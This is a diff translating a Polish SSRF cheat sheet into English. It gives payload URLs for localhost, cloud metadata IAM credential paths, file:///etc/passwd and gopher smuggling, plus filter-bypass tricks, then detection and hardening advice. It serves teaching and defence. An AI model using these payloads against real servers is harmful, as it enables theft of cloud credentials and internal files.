@@ -12,42 +12,42 @@ author: "core"
 # Server-Side Request Forgery (SSRF)
 
 ## TL;DR
-Aplikacja pobiera URL podany przez użytkownika → zmuszasz serwer do żądań do zasobów wewnętrznych (metadata chmury, usługi wewnętrzne, port scan). W chmurze prowadzi do kradzieży credentiali IAM.
+The application fetches a user-supplied URL → you force the server to make requests to internal resources (cloud metadata, internal services, port scan). In the cloud it leads to theft of IAM credentials.
 
-## Payloady
+## Payloads
 ```text
 http://127.0.0.1:80/           # localhost
 http://169.254.169.254/        # cloud metadata (AWS/GCP/Azure)
 http://[::1]/                  # IPv6 loopback
 file:///etc/passwd             # file scheme
-gopher://...                   # smuggling do usług (Redis, SMTP)
+gopher://...                   # smuggling to services (Redis, SMTP)
 ```
 
-## Cloud metadata (klucz w SSRF)
+## Cloud metadata (the SSRF prize)
 ```bash
-# AWS IMDSv1 (jeśli włączone) – kradzież ról
+# AWS IMDSv1 (if enabled) – role theft
 http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
-# GCP (wymaga nagłówka)
+# GCP (requires a header)
 http://metadata.google.internal/computeMetadata/v1/  (Metadata-Flavor: Google)
 # Azure IMDS
 http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Metadata: true)
 ```
 
-## Omijanie filtrów
+## Filter bypasses
 ```text
 http://0177.0.0.1     (octal)   http://2130706433 (decimal)
 http://localhost.attacker.com   (DNS rebinding)
-http://foo@127.0.0.1  (userinfo)  redirecty 301->internal
+http://foo@127.0.0.1  (userinfo)  301->internal redirects
 ```
 
-## Wykrywanie (Blue Team)
-- Serwer aplikacyjny łączący się do `169.254.169.254` / wewnętrznych IP.
-- Anomalne żądania wychodzące z warstwy aplikacji.
+## Detection (Blue Team)
+- The app server connecting to `169.254.169.254` / internal IPs.
+- Anomalous outbound requests from the application layer.
 
-## Mitygacja / Hardening
-- **IMDSv2** (AWS, wymaga tokenu — blokuje proste SSRF), usuń IMDSv1.
-- Allow-list docelowych hostów, blokuj RFC1918/link-local, walidacja po rozwiązaniu DNS.
-- Segmentacja sieci, brak dostępu app→metadata gdy zbędny.
+## Mitigation / Hardening
+- **IMDSv2** (AWS, requires a token — blocks simple SSRF), remove IMDSv1.
+- Allow-list of target hosts, block RFC1918/link-local, validate after DNS resolution.
+- Network segmentation, no app→metadata access where unneeded.
 
-## Źródła
+## Sources
 - [PortSwigger – SSRF](https://portswigger.net/web-security/ssrf)
